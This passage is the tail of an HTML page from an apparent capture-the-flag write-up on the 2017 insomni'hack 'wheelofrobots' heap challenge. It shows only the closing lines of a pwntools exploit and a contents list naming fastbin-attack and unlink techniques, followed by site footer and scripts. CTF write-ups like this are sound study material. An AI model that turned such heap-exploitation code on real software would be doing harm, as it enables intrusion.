class="line">remove(<span class="number">6</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-attach%E4%BB%BB%E6%84%8F%E9%95%BF%E5%BA%A6%E5%A0%86%E6%BA%A2%E5%87%BA"><span class="toc-number">1.</span> <span class="toc-text">fastbin attach任意长度堆溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0unlink"><span class="toc-number">2.</span> <span class="toc-text">构造unlink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%81%E5%8A%9E%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">老办法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B0%E5%8A%9E%E6%B3%95"><span class="toc-number">4.</span> <span class="toc-text">新办法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">5.</span> <span class="toc-text">EXP</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/&text=2017 insomni&#39;hack wheelofrobots"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/&title=2017 insomni&#39;hack wheelofrobots"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/&is_video=false&description=2017 insomni&#39;hack wheelofrobots"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2017 insomni&#39;hack wheelofrobots&body=Check out this article: https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/&title=2017 insomni&#39;hack wheelofrobots"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/&title=2017 insomni&#39;hack wheelofrobots"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/&title=2017 insomni&#39;hack wheelofrobots"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/&title=2017 insomni&#39;hack wheelofrobots"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/&name=2017 insomni&#39;hack wheelofrobots&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/03/16/2017-insomn-hack-wheelofrobots/&t=2017 insomni&#39;hack wheelofrobots"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    bxz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?a22ef0bec4e4a9c7337bea6e37ff55c1";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
